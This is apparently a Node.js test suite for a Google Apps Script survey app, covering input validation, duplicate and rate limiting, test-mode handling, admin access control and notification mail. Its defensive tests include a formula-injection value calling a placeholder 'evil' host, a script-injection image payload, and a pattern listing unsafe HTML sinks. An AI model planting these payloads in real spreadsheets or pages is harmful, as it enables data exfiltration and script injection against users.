/*
 * gas/survey/（公開Web App・管理者Web App）のテスト（Issue #374）。
 * prepare-survey-gas-project.js が出力する配布物をそのままvmで実行する。
 */
'use strict';

var test = require('node:test');
var assert = require('node:assert');
var fs = require('fs');
var path = require('path');
var Core = require('../scripts/survey-core.js');
var schema = require('../survey/survey-schema.json');
var A = require('./helpers/survey-answers');
var loadSurveyProject = require('./helpers/survey-env').loadSurveyProject;
var prepare = require('../scripts/prepare-survey-gas-project');

var HASH = '123e4567-e89b-42d3-a456-426614174000';
var NOW = new Date('2026-10-08T03:00:00.000Z');

function body(answers, extra) {
  return JSON.stringify(Object.assign({ schema_version: schema.version, respondent_hash: HASH, answers: answers }, extra || {}));
}
function call(project, action, bodyText) {
  project.sandbox.__body = bodyText;
  project.sandbox.__now = NOW;
  project.sandbox.__action = action;
  return project.run('handleSurveyRequest_(__action, __body, __now)');
}
function setup(project) { project.run('setupSurveySpreadsheet()'); }

test('配布物: 公開プロジェクトに管理者機能・集計を含めず、管理者プロジェクトに回答受付を含めない', function () {
  var pub = prepare.fileNames('public');
  var adm = prepare.fileNames('admin');
  assert.ok(pub.indexOf('SurveyWebApp.gs') !== -1);
  assert.ok(pub.indexOf('SurveyAdmin.gs') === -1 && pub.indexOf('SurveyAnalytics.gs') === -1 && pub.indexOf('SurveyAdminPage.html') === -1);
  assert.ok(adm.indexOf('SurveyAdmin.gs') !== -1 && adm.indexOf('SurveyWebApp.gs') === -1);
  var manifests = {
    pub: JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'gas/survey/public/appsscript.json'), 'utf8')),
    adm: JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'gas/survey/admin/appsscript.json'), 'utf8'))
  };
  assert.strictEqual(manifests.pub.webapp.access, 'ANYONE_ANONYMOUS');
  assert.strictEqual(manifests.adm.webapp.access, 'MYSELF');
  assert.strictEqual(manifests.adm.webapp.executeAs, 'USER_ACCESSING');
  /* 公開側は Spreadsheet と通知メール送信（Issue #391）以外の権限を要求しない */
  assert.deepStrictEqual(manifests.pub.oauthScopes, ['https://www.googleapis.com/auth/spreadsheets', 'https://www.googleapis.com/auth/script.send_mail']);
  assert.ok(Object.keys(prepare.TARGETS).length === 2);
});

test('setup: schemaから responses / events / questions / settings を作る（冪等）', function () {
  var project = loadSurveyProject('public');
  setup(project);
  setup(project);
  assert.deepStrictEqual(project.sheets.responses._rows[0], Core.responseColumns(schema));
  assert.deepStrictEqual(project.sheets.events._rows[0], ['timestamp', 'respondent_hash', 'step_id', 'is_test']);
  assert.ok(project.sheets.questions._rows.length > 30);
  assert.strictEqual(project.sheets.settings._rows[1][1], String(schema.version));
});

test('submit: 検証済みの行を保存し、定義外・条件外の値は保存しない', function () {
  var project = loadSurveyProject('public');
  var result = call(project, 'submit', body(A.nonuser({ evil: 'x', visit_count: 'once', reuse_intent: 'definitely' }), { survey_path: 'x_main' }));
  assert.deepStrictEqual(JSON.parse(JSON.stringify(result)), { success: true });
  var rows = project.sheets.responses._rows;
  assert.strictEqual(rows.length, 2);
  var columns = rows[0];
  var row = {};
  columns.forEach(function (c, i) { row[c] = rows[1][i]; });
  assert.strictEqual(row.respondent_hash, HASH);
  assert.strictEqual(row.usage_segment, 'solo');
  assert.strictEqual(row.visit_count, '');
  assert.strictEqual(row.reuse_intent, '');
  assert.strictEqual(row.survey_path, 'x_main');
  assert.strictEqual(row.timestamp, NOW.toISOString());
  assert.ok(columns.indexOf('evil') === -1);
});

test('submit: 18歳未満・不正値は保存しない', function () {
  var project = loadSurveyProject('public');
  var under = call(project, 'submit', body(A.user({ age_screening: 'under_18' })));
  assert.strictEqual(under.success, false);
  assert.strictEqual(under.error.code, 'AGE_NOT_ELIGIBLE');
  var bad = call(project, 'submit', body(A.user({ usage_status: 'zzz' })));
  assert.strictEqual(bad.error.code, 'VALIDATION_FAILED');
  assert.strictEqual(JSON.stringify(bad).indexOf('zzz'), -1, '入力値をエラー応答へ反射しない');
  assert.strictEqual(project.sheets.responses, undefined, '保存先シートも作られない');
});

test('submit: 不正JSON・過大・schema版不一致・未知アクション・respondent_hash不正を拒否する', function () {
  var project = loadSurveyProject('public');
  assert.strictEqual(call(project, 'submit', '{not json').error.code, 'INVALID_JSON');
  assert.strictEqual(call(project, 'submit', '[]').error.code, 'INVALID_PAYLOAD');
  assert.strictEqual(call(project, 'submit', 'x'.repeat(20001)).error.code, 'PAYLOAD_TOO_LARGE');
  assert.strictEqual(call(project, 'drop', '{}').error.code, 'UNKNOWN_ACTION');
  assert.strictEqual(call(project, 'submit', JSON.stringify({ schema_version: 999, respondent_hash: HASH, answers: A.user() })).error.code, 'SCHEMA_VERSION_MISMATCH');
  var noHash = call(project, 'submit', JSON.stringify({ schema_version: schema.version, respondent_hash: 'abc', answers: A.user() }));
  assert.strictEqual(noHash.error.code, 'VALIDATION_FAILED');
  assert.strictEqual(project.sheets.responses, undefined);
});

function rowObjects(project) {
  var rows = project.sheets.responses._rows;
  return rows.slice(1).map(function (r) {
    var o = {};
    rows[0].forEach(function (c, i) { o[c] = r[i]; });
    return o;
  });
}
var OTHER_HASH = '123e4567-e89b-42d3-a456-426614174999';

test('重複回答防止: 同じrespondent_hashの2回目は DUPLICATE_RESPONSE で拒否し、行を増やさず既存行も上書きしない', function () {
  var project = loadSurveyProject('public');
  assert.strictEqual(call(project, 'submit', body(A.user())).success, true);
  var before = JSON.stringify(project.sheets.responses._rows);
  var second = call(project, 'submit', body(A.nonuser()));
  assert.strictEqual(second.success, false);
  assert.strictEqual(second.error.code, 'DUPLICATE_RESPONSE');
  assert.strictEqual(project.sheets.responses._rows.length, 2);
  assert.strictEqual(JSON.stringify(project.sheets.responses._rows), before, '既存行は変更されない');
  var other = call(project, 'submit', JSON.stringify({ schema_version: schema.version, respondent_hash: OTHER_HASH, answers: A.user() }));
  assert.strictEqual(other.success, true);
  assert.strictEqual(project.sheets.responses._rows.length, 3);
});

test('is_test: 通常回答は 0、?test=1 の回答は 1 で保存される', function () {
  var project = loadSurveyProject('public');
  call(project, 'submit', body(A.user()));
  call(project, 'submit', body(A.user(), { is_test: 1 }));
  var rows = rowObjects(project);
  assert.deepStrictEqual(rows.map(function (r) { return String(r.is_test); }), ['0', '1']);
  assert.strictEqual(Core.isTestFlag(rows[0].is_test), false);
  assert.strictEqual(Core.isTestFlag(rows[1].is_test), true);
});

test('is_test: "1"や"true"など厳密な1/true以外は本番扱い（クライアント値の曖昧解釈をしない）', function () {
  var project = loadSurveyProject('public');
  ['1', 'true', 2, null, 'yes'].forEach(function (value, i) {
    call(project, 'submit', JSON.stringify({ schema_version: schema.version, respondent_hash: '123e4567-e89b-42d3-a456-42661417410' + i, is_test: value, answers: A.user() }));
  });
  rowObjects(project).forEach(function (r) { assert.strictEqual(String(r.is_test), '0'); });
});

test('テストモード: 同じrespondent_hashで何度でも保存でき、本番の重複判定にも数えない', function () {
  var project = loadSurveyProject('public');
  assert.strictEqual(call(project, 'submit', body(A.user(), { is_test: 1 })).success, true);
  assert.strictEqual(call(project, 'submit', body(A.user(), { is_test: 1 })).success, true);
  assert.strictEqual(call(project, 'submit', body(A.user(), { is_test: 1 })).success, true);
  assert.strictEqual(project.sheets.responses._rows.length, 4);
  /* 先にテストしたブラウザでも、通常回答は1回だけ保存できる */
  assert.strictEqual(call(project, 'submit', body(A.user())).success, true);
  assert.strictEqual(call(project, 'submit', body(A.user())).error.code, 'DUPLICATE_RESPONSE');
  assert.strictEqual(project.sheets.responses._rows.length, 5);
  /* 本番回答の後にテストしても保存できる */
  assert.strictEqual(call(project, 'submit', body(A.user(), { is_test: 1 })).success, true);
  assert.strictEqual(project.sheets.responses._rows.length, 6);
});

test('テストモードでもサーバー側検証は緩めない（18歳未満・必須不足・不正値・schema版・rate limit）', function () {
  var project = loadSurveyProject('public', { properties: { SURVEY_RATE_LIMIT_PER_MINUTE: '4' } });
  assert.strictEqual(call(project, 'submit', body(A.user({ age_screening: 'under_18' }), { is_test: 1 })).error.code, 'AGE_NOT_ELIGIBLE');
  assert.strictEqual(call(project, 'submit', body(A.user({ usage_status: 'zzz' }), { is_test: 1 })).error.code, 'VALIDATION_FAILED');
  var missing = A.user();
  delete missing.prefecture;
  assert.strictEqual(call(project, 'submit', body(missing, { is_test: 1 })).error.code, 'VALIDATION_FAILED');
  assert.strictEqual(call(project, 'submit', JSON.stringify({ schema_version: 999, respondent_hash: HASH, is_test: 1, answers: A.user() })).error.code, 'SCHEMA_VERSION_MISMATCH');
  assert.strictEqual(call(project, 'submit', JSON.stringify({ schema_version: schema.version, respondent_hash: 'bad', is_test: 1, answers: A.user() })).error.code, 'VALIDATION_FAILED');
  assert.strictEqual(call(project, 'submit', body(A.user(), { is_test: 1 })).error.code, 'RATE_LIMITED');
  assert.strictEqual(project.sheets.responses, undefined, '拒否されたtest送信は何も保存しない');
});

test('testモードの条件外の値は通常どおり破棄される（hidden値破棄）', function () {
  var project = loadSurveyProject('public');
  call(project, 'submit', body(A.nonuser({ visit_count: 'once', reuse_intent: 'definitely' }), { is_test: 1 }));
  var row = rowObjects(project)[0];
  assert.strictEqual(row.visit_count, '');
  assert.strictEqual(row.reuse_intent, '');
});

test('event: is_test=1 のイベントは is_test=1 で保存され、通常イベントは 0', function () {
  var project = loadSurveyProject('public');
  call(project, 'event', JSON.stringify({ schema_version: schema.version, respondent_hash: HASH, step_id: 'privacy', is_test: 1 }));
  call(project, 'event', JSON.stringify({ schema_version: schema.version, respondent_hash: HASH, step_id: 'privacy' }));
  var rows = project.sheets.events._rows;
  assert.deepStrictEqual([rows[1][3], rows[2][3]], ['1', '0']);
});

/* 旧Spreadsheet（is_test列なし）を再現する。旧ヘッダ＋旧行を直接書く。 */
function legacySheets(project) {
  var oldResponses = Core.responseColumns(schema).slice(0, -1);
  project.sandbox.__old = oldResponses;
  project.run('SpreadsheetApp.openById("ss-survey").insertSheet("responses")');
  project.run('SpreadsheetApp.openById("ss-survey").insertSheet("events")');
  var res = project.sheets.responses;
  res.insertColumnsAfter(26, oldResponses.length - 26);
  res.getRange(1, 1, 1, oldResponses.length).setValues([oldResponses]);
  var rec = Core.validateSubmission(schema, { respondent_hash: HASH, survey_path: 'old', answers: A.user() }).record;
  var legacyRow = Core.recordToRow(schema, rec, '2026-10-01T00:00:00.000Z').slice(0, oldResponses.length);
  res.getRange(2, 1, 1, legacyRow.length).setValues([legacyRow]);
  var ev = project.sheets.events;
  ev.getRange(1, 1, 1, 3).setValues([['timestamp', 'respondent_hash', 'step_id']]);
  ev.getRange(2, 1, 1, 3).setValues([['2026-10-01T00:00:00.000Z', HASH, 'privacy']]);
  return JSON.stringify([res._rows, ev._rows]);
}

test('既存Spreadsheet互換: is_test列の無い旧ヘッダでも新規保存でき、既存行は変更されず、ヘッダだけ追記される', function () {
  var project = loadSurveyProject('public');
  var before = JSON.parse(legacySheets(project));
  var result = call(project, 'submit', body(A.user(), { survey_path: 'new' }));
  /* 旧行(=本番扱い)と同じrespondent_hashなので通常回答は重複として拒否される */
  assert.strictEqual(result.error.code, 'DUPLICATE_RESPONSE');
  var fresh = call(project, 'submit', JSON.stringify({ schema_version: schema.version, respondent_hash: OTHER_HASH, answers: A.user() }));
  assert.strictEqual(fresh.success, true);
  var rows = project.sheets.responses._rows;
  assert.strictEqual(rows.length, 3);
  assert.deepStrictEqual(rows[0], Core.responseColumns(schema), 'ヘッダへis_testが追記される');
  assert.deepStrictEqual(rows[1], before[0][1], '既存回答行は削除・上書きされない');
  assert.strictEqual(rows[2][rows[0].indexOf('is_test')], '0');
  /* テスト送信は旧行と同じIDでも保存でき、旧行は上書きされない */
  assert.strictEqual(call(project, 'submit', body(A.user(), { is_test: 1 })).success, true);
  assert.deepStrictEqual(project.sheets.responses._rows[1], before[0][1]);
  assert.strictEqual(project.sheets.responses._rows.length, 4);
  /* events も同様 */
  assert.strictEqual(call(project, 'event', JSON.stringify({ schema_version: schema.version, respondent_hash: HASH, step_id: 'privacy', is_test: 1 })).success, true);
  var events = project.sheets.events._rows;
  assert.deepStrictEqual(events[0], Core.eventColumns());
  assert.deepStrictEqual(events[1], before[1][1]);
  assert.strictEqual(events[2][3], '1');
});

test('既存Spreadsheet互換: setupSurveySpreadsheet は旧ヘッダへis_test列を追記し、既存行を保持する（冪等）', function () {
  var project = loadSurveyProject('public');
  var before = JSON.parse(legacySheets(project));
  setup(project);
  setup(project);
  assert.deepStrictEqual(project.sheets.responses._rows[0], Core.responseColumns(schema));
  assert.deepStrictEqual(project.sheets.responses._rows[1], before[0][1]);
  assert.deepStrictEqual(project.sheets.events._rows[0], Core.eventColumns());
});

test('旧ヘッダの途中がずれていれば従来どおり SCHEMA_MISMATCH（末尾is_test以外は緩めない）', function () {
  var project = loadSurveyProject('public');
  legacySheets(project);
  project.sheets.responses._rows[0][5] = 'tampered';
  assert.strictEqual(call(project, 'submit', body(A.user())).error.code, 'INTERNAL_ERROR');
  assert.strictEqual(project.sheets.responses._rows.length, 2);
});

test('ロック取得失敗時は BUSY を返し保存しない', function () {
  var project = loadSurveyProject('public', { lockFails: true });
  assert.strictEqual(call(project, 'submit', body(A.user())).error.code, 'BUSY');
});

test('ヘッダがschemaと異なるシートへは書き込まない（列ずれ防止）', function () {
  var project = loadSurveyProject('public');
  setup(project);
  project.sheets.responses._rows[0][5] = 'tampered';
  var result = call(project, 'submit', body(A.user()));
  assert.strictEqual(result.error.code, 'INTERNAL_ERROR');
  assert.strictEqual(project.sheets.responses._rows.length, 1);
  assert.ok(project.logs.some(function (l) { return /SCHEMA_MISMATCH/.test(l); }));
});

test('自由記述の数式は無効化して保存し、数値化もさせない', function () {
  var project = loadSurveyProject('public');
  call(project, 'submit', body(A.user({ free_feedback: '=IMPORTXML("http://evil")' })));
  var rows = project.sheets.responses._rows;
  var idx = rows[0].indexOf('free_feedback');
  assert.strictEqual(rows[1][idx], "'=IMPORTXML(\"http://evil\")");
});

test('event: schemaのステップIDのみ受け付ける', function () {
  var project = loadSurveyProject('public');
  var ok = call(project, 'event', JSON.stringify({ schema_version: schema.version, respondent_hash: HASH, step_id: 'privacy' }));
  assert.strictEqual(ok.success, true);
  assert.deepStrictEqual(project.sheets.events._rows[1].slice(1), [HASH, 'privacy', '0']);
  assert.strictEqual(call(project, 'event', JSON.stringify({ schema_version: schema.version, respondent_hash: HASH, step_id: 'nope' })).error.code, 'INVALID_STEP');
  assert.strictEqual(call(project, 'event', JSON.stringify({ schema_version: schema.version, respondent_hash: 'x', step_id: 'privacy' })).error.code, 'INVALID_RESPONDENT');
  assert.strictEqual(project.sheets.events._rows.length, 2);
});

test('レート制限: 上限を超えたら保存しない', function () {
  var project = loadSurveyProject('public', { properties: { SURVEY_RATE_LIMIT_PER_MINUTE: '2' } });
  var codes = [0, 1, 2].map(function (i) {
    var hash = '123e4567-e89b-42d3-a456-42661417400' + i;
    var r = call(project, 'submit', JSON.stringify({ schema_version: schema.version, respondent_hash: hash, answers: A.user() }));
    return r.success ? 'ok' : r.error.code;
  });
  assert.deepStrictEqual(codes, ['ok', 'ok', 'RATE_LIMITED']);
});

test('doGet/doPost: JSONを返し、Spreadsheet IDやschemaを露出しない', function () {
  var project = loadSurveyProject('public', { properties: { SURVEY_SPREADSHEET_ID: 'ss-survey' } });
  var get = project.run('doGet()');
  assert.ok(!/ss-survey|steps|analysis/.test(get.text));
  project.sandbox.__e = { parameter: { action: 'submit' }, postData: { contents: body(A.user()) } };
  var post = project.run('doPost(__e)');
  assert.deepStrictEqual(JSON.parse(post.text), { success: true });
  assert.ok(!/ss-survey/.test(post.text));
  project.sandbox.__e = { parameter: {}, postData: { contents: '{}' } };
  assert.strictEqual(JSON.parse(project.run('doPost(__e)').text).error.code, 'SCHEMA_VERSION_MISMATCH');
});

function seedResponses(adminProject, n) {
  adminProject.run('setupSurveySpreadsheet()');
  for (var i = 0; i < n; i++) {
    var record = Core.validateSubmission(schema, {
      respondent_hash: '123e4567-e89b-42d3-a456-' + String(200000000000 + i),
      answers: i % 2 ? A.user({ free_feedback: '<img src=x onerror=alert(1)>' }) : A.nonuser()
    }).record;
    var sheet = adminProject.sheets.responses;
    sheet._rows.push(Core.recordToRow(schema, record, '2026-10-08T15:30:00.000Z'));
  }
}

test('管理者: SURVEY_ADMIN_EMAILS未設定・未許可・メール取得不可はすべて拒否（fail closed）', function () {
  var open = loadSurveyProject('admin', { activeEmail: 'owner@example.com' });
  assert.strictEqual(open.run('doGet()').kind, 'text');
  assert.throws(function () { open.run('getSurveyDashboard({segment:"all"})'); }, /FORBIDDEN/);

  var stranger = loadSurveyProject('admin', { activeEmail: 'stranger@example.com', properties: { SURVEY_ADMIN_EMAILS: 'owner@example.com' } });
  assert.strictEqual(stranger.run('doGet()').kind, 'text');
  assert.throws(function () { stranger.run('getSurveyDashboard({})'); }, /FORBIDDEN/);

  var anonymous = loadSurveyProject('admin', { activeEmail: '', properties: { SURVEY_ADMIN_EMAILS: 'owner@example.com' } });
  assert.throws(function () { anonymous.run('getSurveyDashboard({})'); }, /FORBIDDEN/);
});

test('管理者: 許可されたアカウントだけがダッシュボードを取得でき、個別回答行は返らない', function () {
  var admin = loadSurveyProject('admin', { activeEmail: 'Owner@Example.com', properties: { SURVEY_ADMIN_EMAILS: 'owner@example.com, other@example.com' } });
  assert.strictEqual(admin.run('doGet()').kind, 'file');
  seedResponses(admin, 6);
  var json = admin.run('JSON.stringify(getSurveyDashboard({segment:"all"}))');
  var dashboard = JSON.parse(json);
  assert.strictEqual(dashboard.summary.n, 6);
  assert.strictEqual(dashboard.funnels.nonuser.total, 3);
  assert.ok(dashboard.crosstabs.length >= 17);
  assert.ok(!/respondent_hash|123e4567|T15:30/.test(json));
  assert.strictEqual(dashboard.freeText.length, 3);
  assert.strictEqual(dashboard.freeText[0].date, '2026-10-09');
  assert.strictEqual(dashboard.freeText[0].free_feedback, '<img src=x onerror=alert(1)>', 'サーバーは生文字列を返し、画面側でtextContent表示する');
  var filtered = JSON.parse(admin.run('JSON.stringify(getSurveyDashboard({segment:"male_male"}))'));
  assert.strictEqual(filtered.summary.n, 3);
});

test('管理者: test回答・testイベントは件数・ファネル・クロス集計・WTP・step reach・日別・自由記述から除外される', function () {
  var admin = loadSurveyProject('admin', { activeEmail: 'owner@example.com', properties: { SURVEY_ADMIN_EMAILS: 'owner@example.com' } });
  seedResponses(admin, 6);
  var baseline = JSON.parse(admin.run('JSON.stringify(getSurveyDashboard({segment:"all"}))'));
  var sheet = admin.sheets.responses;
  /* test回答を多数混ぜる（free_feedback付き・価格設問付き） */
  for (var i = 0; i < 25; i++) {
    var rec = Core.validateSubmission(schema, {
      respondent_hash: '123e4567-e89b-42d3-a456-' + String(300000000000 + i), is_test: 1,
      answers: A.user({ free_feedback: 'TESTROW', paid_options_interest: ['photo_equipment'], price_photo_equipment: 'y1000' })
    }).record;
    sheet._rows.push(Core.recordToRow(schema, rec, '2026-10-08T15:30:00.000Z'));
  }
  var events = admin.sheets.events;
  events.getRange(2, 1, 1, 4).setValues([['2026-10-08T00:00:00.000Z', HASH, 'privacy', '0']]);
  for (var j = 0; j < 5; j++) events.getRange(3 + j, 1, 1, 4).setValues([['2026-10-08T00:00:00.000Z', '123e4567-e89b-42d3-a456-42661417420' + j, 'privacy', '1']]);
  var json = admin.run('JSON.stringify(getSurveyDashboard({segment:"all"}))');
  var withTest = JSON.parse(json);
  assert.strictEqual(withTest.summary.n, 6, '本番件数にtestが入らない');
  assert.ok(json.indexOf('TESTROW') === -1);
  assert.deepStrictEqual(withTest.funnels, baseline.funnels);
  assert.deepStrictEqual(withTest.crosstabs, baseline.crosstabs);
  assert.deepStrictEqual(withTest.priceAcceptance, baseline.priceAcceptance);
  assert.deepStrictEqual(withTest.distributions, baseline.distributions);
  assert.deepStrictEqual(withTest.segmentComparison, baseline.segmentComparison);
  assert.deepStrictEqual(withTest.responsesByDate, baseline.responsesByDate);
  var reach = withTest.stepReach.filter(function (r) { return r.id === 'privacy'; })[0];
  assert.strictEqual(reach.count, 1, 'testイベントがstep reach/drop-offに入らない');
});

test('管理者: 旧ヘッダ（is_test列なし）のSpreadsheetでも集計でき、既存行は本番扱い', function () {
  var admin = loadSurveyProject('admin', { activeEmail: 'owner@example.com', properties: { SURVEY_ADMIN_EMAILS: 'owner@example.com' } });
  legacySheets(admin);
  var dashboard = JSON.parse(admin.run('JSON.stringify(getSurveyDashboard({segment:"all"}))'));
  assert.strictEqual(dashboard.summary.n, 1);
  assert.strictEqual(dashboard.stepReach.filter(function (r) { return r.id === 'privacy'; })[0].count, 1);
});

test('管理画面HTMLは自由記述をinnerHTMLへ入れずtextContentで出す', function () {
  var html = fs.readFileSync(path.join(__dirname, '..', 'gas/survey/admin/SurveyAdminPage.html'), 'utf8');
  assert.ok(!/innerHTML|insertAdjacentHTML|document\.write|eval\(/.test(html));
  assert.match(html, /textContent/);
  assert.match(html, /n &lt; <span id="mincell">/);
  assert.match(html, /td\.low/);
});

var NOTIFY = { SURVEY_NOTIFICATION_EMAIL: 'admin@example.com', SURVEY_ADMIN_URL: 'https://example.com/admin' };

test('通知メール(#391): 本番回答の保存後に1通送る（日時・usage_segment・管理画面URLを含み、hashは含まない）', function () {
  var project = loadSurveyProject('public', { properties: NOTIFY });
  assert.strictEqual(call(project, 'submit', body(A.nonuser())).success, true);
  assert.strictEqual(project.mails.length, 1);
  var mail = project.mails[0];
  assert.strictEqual(mail.to, 'admin@example.com');
  assert.strictEqual(mail.subject, '【Studio Nagoya Base】新しいフィードバック回答がありました');
  assert.ok(mail.body.indexOf(NOW.toISOString()) !== -1);
  assert.ok(mail.body.indexOf('usage_segment: solo') !== -1);
  assert.ok(mail.body.indexOf('https://example.com/admin') !== -1);
  assert.strictEqual(mail.body.indexOf(HASH), -1);
});

test('通知メール(#391): テスト・重複・検証エラー・保存エラーでは送らない', function () {
  var project = loadSurveyProject('public', { properties: NOTIFY });
  call(project, 'submit', body(A.user(), { is_test: 1 }));
  assert.strictEqual(project.mails.length, 0);
  call(project, 'submit', body(A.user()));
  call(project, 'submit', body(A.user()));
  assert.strictEqual(project.mails.length, 1, '重複は通知しない');
  call(project, 'submit', JSON.stringify({ schema_version: schema.version, respondent_hash: OTHER_HASH, answers: A.user({ age_screening: 'under_18' }) }));
  call(project, 'submit', JSON.stringify({ schema_version: schema.version, respondent_hash: OTHER_HASH, answers: A.user({ usage_status: 'zzz' }) }));
  assert.strictEqual(project.mails.length, 1);
  var busy = loadSurveyProject('public', { properties: NOTIFY, lockFails: true });
  assert.strictEqual(call(busy, 'submit', body(A.user())).error.code, 'BUSY');
  assert.strictEqual(busy.mails.length, 0);
});

test('通知メール(#391): 送信失敗・通知先未設定でも回答は保存され成功扱い', function () {
  var failing = loadSurveyProject('public', { properties: NOTIFY, mailFails: true });
  assert.strictEqual(call(failing, 'submit', body(A.user())).success, true);
  assert.strictEqual(failing.sheets.responses._rows.length, 2);
  assert.ok(failing.logs.some(function (l) { return /notify failed/.test(l); }));
  var unset = loadSurveyProject('public');
  assert.strictEqual(call(unset, 'submit', body(A.user())).success, true);
  assert.strictEqual(unset.mails.length, 0);
  assert.strictEqual(unset.sheets.responses._rows.length, 2);
});
